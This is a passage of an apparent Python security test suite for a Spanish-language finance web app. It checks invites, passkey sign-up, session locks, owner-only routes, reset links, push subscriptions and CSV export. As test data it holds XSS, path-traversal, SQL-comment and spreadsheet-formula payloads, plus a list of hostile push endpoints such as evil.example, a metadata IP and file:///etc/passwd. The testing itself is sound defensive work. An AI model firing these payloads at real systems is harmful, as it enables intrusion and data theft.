    seen = [pt for pt in ["/api/imports", f"/api/imports/csv-maps/{sig}", "/api/imports/recurring", "/api/pasos",
                          f"/api/movements?month={month}&limit=300", "/api/review"]
            if MARK.encode() in (r := req("GET", pt, cookie=b_cookie)).body or (pt.startswith("/api/imports/csv-maps") and r.json() != {"account_id": None, "map": None})
            or (pt == "/api/imports" and r.json()["items"])]
    check("bob sees none of alice's imports, her column map (an empty answer, same as no map), fixed payments or rows",
          not seen, ", ".join(seen))
    check("alice's imports and rows unchanged after bob's tries", req("GET", "/api/imports", cookie=a_cookie).body == mine
          and req("GET", "/api/export.csv", cookie=a_cookie).body == before)


# ---------------------------------------------------------------- Seguridad: Cuentas review (Nov 25 2026)
# Invites, sign-up, Face ID (passkeys through Chrome's virtual authenticator over CDP), the Face ID lock, Mi cuenta
# and the owner's Personas screen. Face ID needs a host name, so the browser opens http://localhost:<port>;
# attack.sh starts the server with that APP_ORIGIN and RP_ID. Every request gets its own made-up CF-Connecting-IP
# (the sign-in limit is 10 a minute per IP). Proofs, codes, tokens and cookies stay in memory and are never printed.

CU_LOCAL = BASE.replace("http://127.0.0.1:", "http://localhost:")
CU_VENDOR = "/vendor/simplewebauthn-browser-14.0.0/esm/index.js"
CU_MARK = "DANAMARK"
CU_IP = [0]
# The only words a session label may hold (src/lib/session.ts deviceLabel).
CU_LABEL = r"^((iPhone|iPad|Android|Mac|Windows|ChromeOS|Linux)( · (Edge|Firefox|Chrome|Safari))?|Edge|Firefox|Chrome|Safari)?$"
# Every route behind the session, with a sample path. A locked session must get 423 on all of them.
CU_LOCKED_ROUTES = [
    ("GET", "/api/bootstrap"), ("GET", "/api/summary?month=2026-11"), ("GET", "/api/movements"), ("GET", "/api/movements/1"),
    ("GET", "/api/export.csv?month=2026-11"), ("GET", "/api/review"), ("GET", "/api/suggest?q=a"), ("GET", "/api/setup"),
    ("GET", "/api/account"), ("GET", "/api/members"), ("GET", "/api/users"),
    ("POST", "/api/movements"), ("PUT", "/api/movements/1"), ("DELETE", "/api/movements/1"), ("POST", "/api/movements/1/merge"),
    ("POST", "/api/accounts"), ("PUT", "/api/accounts/1"), ("POST", "/api/categories"), ("PUT", "/api/categories/1"),
    ("POST", "/api/groups"), ("PUT", "/api/groups/1"), ("POST", "/api/review/1/categorize"), ("POST", "/api/suggestions/1/accept"),
    ("POST", "/api/suggestions/1/reject"), ("POST", "/api/setup/life"), ("PUT", "/api/setup/card"), ("PUT", "/api/setup/steps/1"),
    ("PUT", "/api/me"), ("PUT", "/api/me/lock"), ("PUT", "/api/me/password"), ("POST", "/api/me/password/salt"),
    ("POST", "/api/me/backup-code"), ("DELETE", "/api/me"), ("DELETE", "/api/sessions/0123456789abcdef"),
    ("POST", "/api/passkeys/options"), ("POST", "/api/passkeys"), ("DELETE", "/api/passkeys/1"),
    ("POST", "/api/invites"), ("DELETE", "/api/invites/1"), ("POST", "/api/members/1/reset"), ("DELETE", "/api/members/1"),
    ("POST", "/api/users/1/logout-all"),
    # Funciones (Nov 25 2026): Personas, Tarjetas, Recurrentes, Alertas, push, Home's extras; the decisions' routes
    ("GET", "/api/people"), ("POST", "/api/people"), ("GET", "/api/people/1"), ("PUT", "/api/people/1"),
    ("POST", "/api/people/1/share"), ("POST", "/api/people/1/they-paid"), ("POST", "/api/people/1/settle"),
    ("DELETE", "/api/people/1/entries/1"), ("GET", "/api/people/movement/1"), ("GET", "/api/cards"), ("PUT", "/api/cards/1"),
    ("POST", "/api/cards/1/statement"), ("DELETE", "/api/cards/1/statement"), ("GET", "/api/recurring"), ("POST", "/api/recurring"), ("PUT", "/api/recurring/1"),
    ("DELETE", "/api/recurring/1"), ("POST", "/api/recurring/dismiss"), ("GET", "/api/alerts/prefs"), ("PUT", "/api/alerts/prefs"),
    ("GET", "/api/alerts"), ("POST", "/api/alerts/dismiss"), ("POST", "/api/push/subscription"), ("DELETE", "/api/push/subscription"),
    ("POST", "/api/push/test"), ("GET", "/api/home/extras?month=2026-11"), ("DELETE", "/api/me/resets/1"), ("POST", "/api/reauth"),
]


def cu_db(sql):
    """One write straight into the throwaway database (only to move a reset link's age past its 24 hours)."""
    import glob
    import sqlite3
    f = [p for p in glob.glob(str(STATE / "v3/d1/miniflare-D1DatabaseObject/*.sqlite")) if "metadata" not in p][0]
    con = sqlite3.connect(f, timeout=15)
    try:
        n = con.execute(sql).rowcount
        con.commit()
        return n
    finally:
        con.close()


def cu_ip():
    CU_IP[0] += 1
    return f"198.18.{CU_IP[0] // 250}.{CU_IP[0] % 250 + 1}"


def cu_req(method, path, body=None, cookie=None, headers=None):
    return req(method, path, body, cookie, {"CF-Connecting-IP": cu_ip(), **(headers or {})})


def cu_cookie(res):
    for c in res.cookies():
        if c.startswith("fz_s=") and not c.startswith("fz_s=;"):
            return c.split(";", 1)[0]
    return ""


def cu_context(browser, cookie=None, ua=None):
    """A browser context with its own IP, a virtual platform authenticator (Face ID) and the page checks."""
    opts = {"viewport": {"width": 390, "height": 844}, "extra_http_headers": {"CF-Connecting-IP": cu_ip()}, "locale": "es-SV"}
    if ua:
        opts["user_agent"] = ua
    ctx = browser.new_context(**opts)
    ctx.add_init_script(INIT + "\nwindow.__h0 = history.length;")
    if cookie:
        name, value = cookie.split("=", 1)
        ctx.add_cookies([{"name": name, "value": value, "domain": "localhost", "path": "/", "httpOnly": True, "sameSite": "Strict"}])
    page = ctx.new_page()
    errors, dialogs = [], []
    page.on("pageerror", lambda e: errors.append(str(e)[:120]))
    page.on("dialog", lambda d: (dialogs.append(d.type), d.dismiss()))
    cdp = ctx.new_cdp_session(page)
    cdp.send("WebAuthn.enable", {"enableUI": False})
    cdp.send("WebAuthn.addVirtualAuthenticator", {"options": {
        "protocol": "ctap2", "transport": "internal", "hasResidentKey": True, "hasUserVerification": True,
        "isUserVerified": True, "automaticPresenceSimulation": True}})
    return ctx, page, errors, dialogs


def cu_wait(page, js, ms=15000):
    """Poll a page expression (the CSP blocks wait_for_function)."""
    for _ in range(ms // 250):
        try:
            if page.evaluate(js):
                return True
        except Exception:  # noqa: BLE001 (a reload in between)
            pass
        page.wait_for_timeout(250)
    return False


# In the page: the WebAuthn ceremonies with the app's own vendored library, and API calls with or without a proof.
CU_JS_UNLOCK = """async ([vendor]) => {
  const m = await import(vendor);
  const post = (p, b) => fetch('/api' + p, {method: 'POST', headers: {'content-type': 'application/json'}, body: JSON.stringify(b)});
  const o = await (await post('/unlock/options', {})).json();
  const r = await (await post('/unlock', {response: await m.startAuthentication({optionsJSON: o.options}), enable: true})).json();
  window.__pA = r.unlock;
  return r.app_lock === true && typeof r.unlock === 'string';
}"""
CU_JS_OTHER_SESSION = """async ([vendor]) => {
  const m = await import(vendor);
  const post = (p, b) => fetch('/api' + p, {method: 'POST', credentials: 'omit', headers: {'content-type': 'application/json'}, body: JSON.stringify(b)});
  const o = await (await post('/login/passkey/options', {})).json();
  const r = await post('/login/passkey', {response: await m.startAuthentication({optionsJSON: o.options})});
  const j = await r.json().catch(() => ({}));
  if (r.status === 200) window.__pB = j.unlock;
  return r.status;
}"""
CU_JS_STATUS = """async ([path, which]) => {
  const h = which ? {'x-fz-unlock': window[which]} : {};
  const r = await fetch('/api' + path, {headers: h});
  return r.status;
}"""
CU_JS_ACCOUNT = """async () => {
  const r = await fetch('/api/account', {headers: {'x-fz-unlock': window.__pA}});
  const j = await r.json();
  return {status: r.status, sids: j.sessions.map((s) => s.id), pks: j.passkeys.map((p) => p.id), lock: j.app_lock,
          labels: j.sessions.map((s) => s.label)};
}"""


def cu_signup_api(token, username, display, key):
    """Sign-up through the password path (no Face ID needed): options, then the sign-up with the ticket."""
    o = cu_req("POST", "/api/signup/options", {"token": token, "username": username, "display_name": display, "lang": "es"})
    if o.status != 200:
        return o, None
    return o, (o.json() or {}).get("ticket")


def cuentas_part():
    import re
    import secrets
    from concurrent.futures import ThreadPoolExecutor
    from playwright.sync_api import sync_playwright

    print("== Seguridad: Cuentas (invites, Face ID, the lock, Mi cuenta, Personas)")
    _, a_pw = creds("alice")
    a_name, _ = creds("alice")
    a = cu_req("POST", "/api/login", {"username": a_name, "passphrase": a_pw})
    a_cookie = cu_cookie(a)
    b_name, b_pw = creds("bob")
    ua = f"Mozilla/5.0 (iPhone; <img src=x onerror=alert(1)>{CU_MARK}) Version/18 Safari/605.1"
    b = cu_req("POST", "/api/login", {"username": b_name, "passphrase": b_pw}, headers={"User-Agent": ua})
    b_cookie = cu_cookie(b)
    if not (a_cookie and b_cookie):
        check("Cuentas: alice and bob sign in", False, f"{a.status} {b.status}")
        return

    # Invite links point at the configured origin, never at the Host header.
    inv1 = cu_req("POST", "/api/invites", {}, a_cookie).json() or {}
    check("invite link uses APP_ORIGIN and carries the token after #", str(inv1.get("url", "")).startswith(CU_LOCAL + "/#/unirse?c="))
    t1 = inv1["url"].split("?c=", 1)[1]
    members0 = len(cu_req("GET", "/api/members", cookie=a_cookie).json()["people"])

    # Usernames: only 3 to 32 of a-z 0-9 . _ - (after lower-casing and trimming); payloads refused, nothing made.
    hostile = ["<img src=x onerror=alert(1)>", "ab", "a" * 33, "../../etc", "ali ce", "=1+1", "admin'--", "\uff44\uff41\uff4e\uff41",
               "@SUM(A1)", "\u200b\u200bx", "a\u0000"]
    bad = [(i, st) for i, u in enumerate(hostile) if (st := cu_signup_api(t1, u, "x", None)[0].status) != 400]
    check("sign-up refuses payload and odd usernames (400, nothing made)", not bad, f"accepted (index, status): {bad}")
    taken = cu_signup_api(t1, " ALICE ", "x", None)[0]
    check("sign-up refuses a taken name after normalizing (409)", taken.status == 409, str(taken.status))
    check("refused sign-ups made no user", len(cu_req("GET", "/api/members", cookie=a_cookie).json()["people"]) == members0)

    # Invite raced: two tickets for one invite, eight sign-ups at once. Exactly one wins; the invite is then spent.
    inv2 = cu_req("POST", "/api/invites", {}, a_cookie).json()
    t2 = inv2["url"].split("?c=", 1)[1]
    tickets = [cu_signup_api(t2, f"race{i}", XSS[i % len(XSS)], None)[1] for i in range(2)]
    key = secrets.token_hex(32)
    with ThreadPoolExecutor(max_workers=8) as ex:
        statuses = list(ex.map(lambda i: cu_req("POST", "/api/signup", {"token": t2, "ticket": tickets[i % 2], "password_key": key}).status, range(8)))
    check("invite raced: 8 sign-ups at once, exactly one made", statuses.count(200) == 1, f"{sorted(statuses)}")
    check("invite raced: one new person only", len(cu_req("GET", "/api/members", cookie=a_cookie).json()["people"]) == members0 + 1)
    replay = [cu_req("POST", "/api/invite", {"token": t2}).status,
              cu_req("POST", "/api/signup/options", {"token": t2, "username": "race9", "display_name": "x", "lang": "es"}).status,
              cu_req("POST", "/api/signup", {"token": t2, "ticket": tickets[0], "password_key": key}).status]
    check("invite replayed after use: refused everywhere (404)", replay == [404, 404, 404], str(replay))

    # Session labels: fixed words only, never the raw User-Agent.
    labels = [s["label"] for s in cu_req("GET", "/api/account", cookie=b_cookie).json()["sessions"]]
    check("session labels hold only fixed device words (payload User-Agent)", all(re.match(CU_LABEL, x or "") for x in labels)
          and not any(CU_MARK in (x or "") or "<" in (x or "") for x in labels))

    # Owner tools for a non-owner: refused, and nothing of anyone in the answer.
    owner_only = [("GET", "/api/members"), ("POST", "/api/invites"), ("DELETE", "/api/invites/1"), ("POST", "/api/members/1/reset"),
                  ("DELETE", "/api/members/1"), ("GET", "/api/users"), ("POST", "/api/users/1/logout-all")]
    leaks = []
    for m, p in owner_only:
        r = cu_req(m, p, {} if m != "GET" else None, b_cookie)
        if r.status not in (403, 404) or b"display_name" in (r.body or b"") or b"username" in (r.body or b""):
            leaks.append(f"{m} {p} {r.status}")
    check("owner routes refuse bob (403/404) and say nothing", not leaks, "; ".join(leaks))

    with sync_playwright() as pw:
        browser = pw.chromium.launch(channel="chrome", headless=True)

        # dana signs up in the browser with Face ID, a payload display name, from the invite link.
        ctx, page, errors, dialogs = cu_context(browser)
        page.goto(inv1["url"], wait_until="networkidle")
        cu_wait(page, "!!document.querySelector('[data-act=suName]')")
        url_now = page.evaluate("location.href")
        same = page.evaluate("history.length === window.__h0")
        check("invite link: token gone from the address bar, its history entry replaced (not added)",
              t1 not in url_now and "c=" not in url_now and same, f"token in url={t1 in url_now} same history length={same}")
        page.click('[data-act="suName"]')
        page.fill('input[name="display"]', f'<img src=x onerror="window.__xss=21">{CU_MARK}')
        page.fill('input[name="username"]', "dana")
        page.click('form[data-submit="suNameSave"] button')
        cu_wait(page, "!!document.querySelector('[data-act=suFid]')")
        page.click('[data-act="suFid"]')
        got = cu_wait(page, "!!document.getElementById('codeText')")
        check("dana signs up with Face ID (virtual authenticator)", got, "; ".join(errors[:2]))
        if not got:
            ctx.close()
            browser.close()
            return
        code = page.evaluate("document.getElementById('codeText').textContent")
        page.check("#codeSaved")
        with page.expect_navigation(wait_until="networkidle"):
            page.click('[data-act="suEnter"]')
        page.wait_for_timeout(800)
        check("after Entrar the backup code is nowhere in the page", not page.evaluate("([c]) => document.documentElement.outerHTML.includes(c)", [code]))
        code = None
        # Invisible characters are either removed before the rules (readBody's cleanText: then it is "dana", taken)
        # or refused by the username rule. Either way no second "dana" that looks the same.
        inv3 = cu_req("POST", "/api/invites", {}, a_cookie).json()
        t3 = inv3["url"].split("?c=", 1)[1]
        twins = [cu_signup_api(t3, u, "x", None)[0].status for u in ("dana\u200b", "\u0000DANA", "da\u200dna")]
        check("look-alike names with invisible characters: taken (409) or refused (400), never made", all(x in (400, 409) for x in twins), str(twins))
        cu_req("DELETE", f"/api/invites/{inv3['id']}", {}, a_cookie)
        cookie_d = next((f"{c['name']}={c['value']}" for c in ctx.cookies() if c["name"] == "fz_s"), "")
        check("dana's session cookie: HttpOnly, SameSite Strict", any(c["name"] == "fz_s" and c["httpOnly"] and c["sameSite"] == "Strict"
                                                                     for c in ctx.cookies()))

        # The Face ID lock: on, then 423 on every route without this session's proof; another session's proof refused.
        check("dana turns the Face ID lock on (Face ID check)", page.evaluate(CU_JS_UNLOCK, [CU_VENDOR]))
        not423 = []
        for m, p in CU_LOCKED_ROUTES:
            for h in ({}, {"x-fz-unlock": "A" * 43}):
                r = cu_req(m, p, {} if m != "GET" else None, cookie_d, h)
                if r.status != 423:
                    not423.append(f"{m} {p} {r.status}")
        check(f"locked session: 423 on all {len(CU_LOCKED_ROUTES)} money and account routes, no or wrong proof", not not423, "; ".join(not423[:4]))
        other = page.evaluate(CU_JS_OTHER_SESSION, [CU_VENDOR])
        st = [page.evaluate(CU_JS_STATUS, ["/bootstrap", w]) for w in (None, "__pB", "__pA")]
        check("a proof from another of her sessions is refused (423); her own works", other == 200 and st == [423, 423, 200], f"{other} {st}")
        csv = page.evaluate("async () => (await fetch('/api/export.csv?month=2026-11', {headers: {'x-fz-unlock': window.__pA}})).status")
        check("CSV export works through fetch with the proof", csv == 200, str(csv))
        acc = page.evaluate(CU_JS_ACCOUNT)
        check("dana's devices list: 2 sessions, 1 Face ID, lock on", acc["status"] == 200 and len(acc["sids"]) == 2 and len(acc["pks"]) == 1 and acc["lock"])

        # bob against dana's sessions and Face IDs: invisible and untouchable (404), for every id.
        bacc = cu_req("GET", "/api/account", cookie=b_cookie).json()
        seen = {s["id"] for s in bacc["sessions"]} | {p["id"] for p in bacc["passkeys"]}
        hits = [cu_req("DELETE", f"/api/sessions/{sid}", {}, b_cookie).status for sid in acc["sids"]]
        b_fresh = (cu_req("POST", "/api/reauth", {"passphrase": b_pw}, b_cookie).json() or {}).get("unlock", "")
        hits += [cu_req("DELETE", f"/api/passkeys/{pid}", {}, b_cookie, {"X-FZ-Unlock": b_fresh}).status for pid in acc["pks"] + list(range(1, 6))]
        after = page.evaluate(CU_JS_ACCOUNT)
        check("bob cannot see or end dana's sessions or Face IDs (404 each)", not (seen & set(acc["sids"] + acc["pks"]))
              and all(h == 404 for h in hits) and after["sids"] == acc["sids"] and after["pks"] == acc["pks"], str(sorted(set(hits))))
        storage = page.evaluate("() => Object.keys(localStorage).concat(Object.keys(sessionStorage))")
        check("only the theme in browser storage", set(storage) <= {"fz_theme"}, str(storage))
        cached = page.evaluate("async () => { const out = []; for (const k of await caches.keys()) for (const r of await (await caches.open(k)).keys()) out.push(new URL(r.url).pathname); return out; }")
        check("no API answer in the offline cache", not [u for u in cached if u.startswith("/api/")])
        check("dana's pages: no payload ran, no dialog, no CSP violation", not page.evaluate("window.__xss") and not dialogs
              and not page.evaluate("window.__csp.length"))
        dana_id = next(p["id"] for p in cu_req("GET", "/api/members", cookie=a_cookie).json()["people"] if p["display_name"].endswith(CU_MARK))

        # alice (owner) sees the payload names as text in Personas; bob gets no Personas screen.
        actx, apage, aerr, adlg = cu_context(browser, a_cookie)
        apage.goto(CU_LOCAL + "/#/ajustes/personas", wait_until="networkidle")
        cu_wait(apage, "document.querySelectorAll('[data-act=psnOpen]').length >= 3")
        text = apage.inner_text("body")
        check("Personas: payload display names shown as text, nothing ran", CU_MARK in text and not apage.evaluate("window.__xss")
              and not adlg and not apage.query_selector(INJECTED) and not aerr, "; ".join(aerr[:2]))
        bctx, bpage, berr, bdlg = cu_context(browser, b_cookie)
        bpage.goto(CU_LOCAL + "/#/ajustes/personas", wait_until="networkidle")
        bpage.wait_for_timeout(800)
        btext = bpage.inner_text("body")
        check("bob opening Personas: sent back, nobody listed", CU_MARK not in btext and "dana" not in btext
              and not bpage.query_selector("[data-act=psnOpen]") and "#/ajustes/personas" not in bpage.evaluate("location.hash"))
        bctx.close()

        # The owner's fresh check on the real screens (Melvin's follow-up, Nov 25 2026): Restablecer Face ID and Quitar
        # each show the check's sheet; closing it changes nothing and says so. The sheet takes the removal form's place,
        # so that message is a toast, not a line in a form that is gone.
        ra_up = "!!document.querySelector('#sheet[open] form[data-submit=raPw]')"
        said = json.dumps(apage.evaluate("async () => (await import('/js/i18n.js')).t('raCancelled')"))
        said = f"document.getElementById('toast').classList.contains('show') && document.getElementById('toast').textContent === {said}"
        steps = []
        for act in ("psnReset", "psnRemove"):
            apage.evaluate("document.getElementById('toast').classList.remove('show')")
            apage.click(f"[data-act=psnOpen][data-id='{dana_id}']")
            cu_wait(apage, "!!document.querySelector('#sheet[open] form[data-submit=psnRemove]')")
            if act == "psnReset":
                apage.click("#sheet [data-act=psnReset]")
            else:
                apage.fill("#sheet form[data-submit=psnRemove] input[name=confirm]", "dana")
                apage.click("#sheet form[data-submit=psnRemove] button")
            steps += [cu_wait(apage, ra_up)]
            apage.click("#sheet [data-act=close]")
            steps += [cu_wait(apage, said, 5000)]
        mem = cu_req("GET", "/api/members", cookie=a_cookie).json()
        check("owner's fresh check on screen: Restablecer Face ID and Quitar ask for it; closing it changes nothing and says so",
              all(steps) and any(p["id"] == dana_id for p in mem["people"]) and not any(i["kind"] == "reset" for i in mem["invites"])
              and not aerr, f"{steps} {aerr[:2]}")

        # The owner's Face ID reset link (Melvin's decision, Nov 25 2026): it works only from 24 hours after it is made,
        # making it ends nothing and dana sees it; then it is used once in a new browser (ending her sessions), then replayed.
        # Making it needs the owner's fresh check (Melvin's follow-up, Nov 25 2026).
        no_fresh = cu_req("POST", f"/api/members/{dana_id}/reset", {}, a_cookie)
        check("the owner needs a fresh check to make a reset link (403 reauth)",
              no_fresh.status == 403 and (no_fresh.json() or {}).get("error") == "reauth", str(no_fresh.status))
        a_fresh = (cu_req("POST", "/api/reauth", {"passphrase": a_pw}, a_cookie).json() or {}).get("unlock", "")
        made = cu_req("POST", f"/api/members/{dana_id}/reset", {}, a_cookie, {"X-FZ-Unlock": a_fresh}).json() or {}
        check("reset link uses APP_ORIGIN", str(made.get("url", "")).startswith(CU_LOCAL + "/#/restablecer?c="))
        rt = made["url"].split("?c=", 1)[1]
        dboot = page.evaluate("async () => { const r = await fetch('/api/bootstrap', {headers: {'x-fz-unlock': window.__pA}}); return {s: r.status, j: await r.json()}; }")
        pend = (dboot.get("j") or {}).get("reset_pending") or []
        check("making a reset link ends nothing; dana's Home data shows it pending, usable 24 h after it was made",
              dboot["s"] == 200 and len(pend) == 1 and pend[0].get("status") == "pending"
              and pend[0]["usable_at"] - pend[0]["made_at"] == 86_400_000 and rt not in json.dumps(pend), str(dboot["s"]))
        wctx, wpage, werr, _ = cu_context(browser)
        wpage.goto(made["url"], wait_until="networkidle")
        waited = cu_wait(wpage, "!!document.querySelector('[data-reset-wait]')")
        early = [cu_req("POST", "/api/reset", {"token": rt}).json() or {}, cu_req("POST", "/api/reset/options", {"token": rt}).status]
        check("in its first 24 hours the link only says from when it works; using it is refused (409); dana stays signed in",
              waited and not wpage.query_selector("[data-act=rsGo]") and early[0].get("pending") is True and "display_name" not in early[0]
              and early[1] == 409 and page.evaluate(CU_JS_STATUS, ["/bootstrap", "__pA"]) == 200 and not werr, f"{early[1]}")
        wctx.close()
        aged = cu_db("UPDATE invites SET created_at = created_at - 86460000 WHERE kind = 'reset' AND used_at IS NULL AND cancelled_at IS NULL")
        check("(test setup) the reset link is moved 24 hours back", aged == 1, str(aged))
        rctx, rpage, rerr, _ = cu_context(browser)
        rpage.goto(made["url"], wait_until="networkidle")
        cu_wait(rpage, "!!document.querySelector('[data-act=rsGo]')")
        check("reset link: token gone from the address bar, its history entry replaced", rt not in rpage.evaluate("location.href")
              and rpage.evaluate("history.length === window.__h0"))
        rpage.click('[data-act="rsGo"]')
        done = cu_wait(rpage, "location.hash === '#/' || location.hash.startsWith('#/pasos') || !!document.getElementById('heroNum')")
        rpage.wait_for_timeout(800)
        check("reset link used once: new Face ID, signed in", done and any(c["name"] == "fz_s" for c in rctx.cookies()), "; ".join(rerr[:2]))
        check("using the reset link ends dana's other sessions", page.evaluate(CU_JS_STATUS, ["/bootstrap", "__pA"]) == 401)
        again = [cu_req("POST", "/api/reset", {"token": rt}).status, cu_req("POST", "/api/reset/options", {"token": rt}).status,
                 cu_req("POST", "/api/reset/finish", {"token": rt, "response": {"id": "x", "rawId": "x", "type": "public-key",
                        "response": {"clientDataJSON": "x", "attestationObject": "x"}, "clientExtensionResults": {}}}).status]
        check("reset link replayed: refused everywhere", all(s in (400, 404) for s in again), str(again))
        old = page.evaluate(CU_JS_OTHER_SESSION, [CU_VENDOR])
        check("the old Face ID no longer signs in after the reset", old != 200, str(old))
        rpage.goto(CU_LOCAL + "/#/ajustes/cuenta", wait_until="networkidle")
        shown = cu_wait(rpage, "!!document.querySelector('[data-resets]')")
        check("Mi cuenta tells dana a reset link was made and used, and by whom", shown and "Alice" in rpage.inner_text("body"))
        racc = rpage.evaluate("async () => (await (await fetch('/api/account')).json()).resets")
        check("her reset history holds dates, what happened and the owner's name only", len(racc) == 1 and racc[0].get("used_at")
              and racc[0].get("status") == "used" and set(racc[0]) <= {"id", "made_at", "usable_at", "expires_at", "used_at", "cancelled_at",
                                                                      "cancelled_by", "status", "by"} and rt not in json.dumps(racc))
        for c in (rctx, actx, ctx):
            c.close()
        browser.close()


# ---------------------------------------------------------------- Seguridad: Funciones review (Nov 25 2026)
# Personas (shares, "pagó por mí", settle-ups), Tarjetas and statements, Recurrentes, Alertas and push subscriptions,
# Home's extras. alice stores payloads in every new free-text field; bob tries each of her ids and must get 404, and
# none of her text reaches bob's answers or screens. The 423 checks for these routes are in CU_LOCKED_ROUTES above.
# No push is ever sent from here: the throwaway server has no VAPID key.

FN_MARK = "FUNMARK"
FN_XSS = f'<img src=x onerror="window.__xss=31">{FN_MARK}'
FN_ALLOWED = "https://fcm.googleapis.com/fcm/send/attack-" + "a" * 20
FN_BAD_ENDPOINTS = [
    "http://fcm.googleapis.com/fcm/send/x", "https://evil.example/fcm/send/x", "https://fcm.googleapis.com.evil.example/x",
    "https://fcm.googleapis.com:8443/x", "https://user:pw@" + "fcm.googleapis.com/x", "https://127.0.0.1/x", "https://169.254.169.254/x",
    "https://push.apple.com/x", "https://web.push.apple.com.evil.example/x", "https://FCM.googleapis.com/x",
    "https://fcm.googleapis.com\\@evil.example/x", "https://evil.example#@fcm.googleapis.com/x", "https://fcm.googleapis.com",
    "https://localhost/x", "file:///etc/passwd", "javascript:alert(1)//fcm.googleapis.com/", "https://xn--fcm-googleapis-com/x",
]


def fn_keys():
    import base64
    import secrets
    b64 = lambda b: base64.urlsafe_b64encode(b).decode().rstrip("=")
    return {"p256dh": b64(b"\x04" + secrets.token_bytes(64)), "auth": b64(secrets.token_bytes(16))}


def fn_day(n):
    import datetime
    return (datetime.date.fromisoformat(TODAY) + datetime.timedelta(days=n)).isoformat()


def funciones_part(acc_id):
    from playwright.sync_api import sync_playwright

    print("== Seguridad: Funciones (Personas, Tarjetas, Recurrentes, Alertas, push)")
    a_name, a_pw = creds("alice")
    b_name, b_pw = creds("bob")
    a_cookie = cu_cookie(cu_req("POST", "/api/login", {"username": a_name, "passphrase": a_pw}))
    b_cookie = cu_cookie(cu_req("POST", "/api/login", {"username": b_name, "passphrase": b_pw}))
    if not (a_cookie and b_cookie):
        check("Funciones: alice and bob sign in", False)
        return
    A = lambda m, path, body=None, h=None: cu_req(m, path, body, a_cookie, h)
    B = lambda m, path, body=None, h=None: cu_req(m, path, body, b_cookie, h)

    # alice's data, a payload in every new free-text field
    pid = (A("POST", "/api/people", {"name": FN_XSS}).json() or {}).get("id")
    card = (A("POST", "/api/accounts", {"name": f"BAC {FN_XSS}", "kind": "tarjeta"}).json() or {}).get("id")
    made = [A("PUT", f"/api/cards/{card}", {"closing_day": 5, "due_day": 20, "limit_cents": 100000}).status,
            A("POST", f"/api/cards/{card}/statement", {"closing_date": fn_day(-10), "due_date": fn_day(2), "min_cents": 2500, "full_cents": 50000}).status]
    rec = (A("POST", "/api/recurring", {"name": FN_XSS, "amount_cents": 1234, "every": "month", "next_date": fn_day(3)}).json() or {}).get("id")
    mov = A("POST", "/api/movements", {"client_id": "fn-share-0001", "amount_cents": 2000, "account_id": acc_id, "comercio": FN_XSS}).json()["movement"]["id"]
    made += [A("POST", f"/api/people/{pid}/share", {"movement_id": mov, "kind": "shared", "cents": 1000, "nota": FN_XSS}).status,
             A("POST", f"/api/people/{pid}/they-paid", {"client_id": "fn-paid-0001", "amount_cents": 700, "comercio": '=HYPERLINK("http://evil.example","x")' + FN_MARK, "nota": FN_XSS}).status,
             A("POST", f"/api/people/{pid}/settle", {"client_id": "fn-settle-001", "amount_cents": 300, "direction": "in", "nota": FN_XSS}).status]
    fx = [A("POST", "/api/movements", {"client_id": f"fn-fx-{i:07d}", "amount_cents": 500, "account_id": acc_id, "fx": f}).status for i, f in enumerate([
        {"currency": "<script>", "cents": 1}, {"currency": "USD", "cents": 1}, {"currency": "cop", "cents": 1}, {"currency": "COP", "cents": 10 ** 14 + 1},
        {"currency": "COP", "cents": 0}, {"currency": "COP", "cents": 1.5}, {"currency": "COP", "cents": "1"}, {"currency": "COP", "cents": 100, "micros": -1},
        {"currency": "COP", "cents": 2_000_000}])]
    entries = (A("GET", f"/api/people/{pid}").json() or {}).get("entries") or []
    check("alice's Funciones data saved with payloads (person, card, statement, recurrente, share, pagó por mí, settle-up)",
          pid and card and rec and made == [200, 200, 201, 201, 201] and len(entries) == 3, str(made))
    check("currency fields: only the listed codes and whole amounts up to 1e14 (8 bad ones 400, a good one 201)",
          fx[:-1] == [400] * 8 and fx[-1] == 201, str(fx))
    paid_mov = next((e["movement_id"] for e in entries if e["kind"] != "shared" and e["movement_id"] and e["movement_id"] != mov), None)
    csv_text = A("GET", "/api/export.csv").body.decode("utf-8-sig")
    bad = [c for row in csv.reader(io.StringIO(csv_text)) for c in row if c[:1] in ("=", "+", "-", "@", "\t", "\r")]
    check("CSV export with the new rows and columns (moneda, pagó por mí): no formula cell", not bad and FN_MARK in csv_text, f"{len(bad)} cells")

    # push subscriptions: the allowlist, then bob cannot take alice's phone
    keys = fn_keys()
    bad_ep = [(e, A("POST", "/api/push/subscription", {"endpoint": e, "keys": keys}).status) for e in FN_BAD_ENDPOINTS]
    check(f"push endpoint allowlist: all {len(FN_BAD_ENDPOINTS)} other addresses refused (400)", all(st == 400 for _, st in bad_ep),
          "; ".join(f"{e[:40]} {st}" for e, st in bad_ep if st != 400))
    badk = [A("POST", "/api/push/subscription", {"endpoint": FN_ALLOWED, "keys": k}).status for k in (
        {"p256dh": "AAAA", "auth": keys["auth"]}, {"p256dh": keys["p256dh"], "auth": "AAAA"}, {"p256dh": "<script>", "auth": keys["auth"]})]
    ok_sub = A("POST", "/api/push/subscription", {"endpoint": FN_ALLOWED, "keys": keys}).status
    taken = B("POST", "/api/push/subscription", {"endpoint": FN_ALLOWED, "keys": fn_keys()}).status
    B("DELETE", "/api/push/subscription", {})
    still = (A("GET", "/api/alerts/prefs").json() or {}).get("subscribed")
    check("push: bad keys 400; alice's phone saved; bob cannot take it (409) or remove it", badk == [400, 400, 400] and ok_sub == 201
          and taken == 409 and still is True, f"{badk} {ok_sub} {taken} {still}")
    nt = B("POST", "/api/push/test", {}).status
    check("push test without a VAPID key: 409, nothing sent", nt == 409, str(nt))

    # bob against every new id route of alice's
    b_acc = (B("GET", "/api/bootstrap").json() or {})["accounts"][0]["id"]
    b_pid = (B("POST", "/api/people", {"name": "Bob friend"}).json() or {}).get("id")
    b_mov = B("POST", "/api/movements", {"client_id": "fn-bob-mov-01", "amount_cents": 900, "account_id": b_acc}).json()["movement"]["id"]
    eid = entries[0]["id"] if entries else 1
    a_st = next((k["statement"] or {}).get("id", 1) for k in A("GET", "/api/cards").json()["cards"] if k["account_id"] == card)
    before = [A("GET", f"/api/people/{pid}").body, A("GET", "/api/cards").body, A("GET", "/api/recurring").body]
    tries = [
        ("GET", f"/api/people/{pid}", None), ("PUT", f"/api/people/{pid}", {"name": "bob"}), ("PUT", f"/api/people/{pid}", {"archived": True}),
        ("POST", f"/api/people/{pid}/share", {"movement_id": b_mov, "kind": "shared", "cents": 100}),
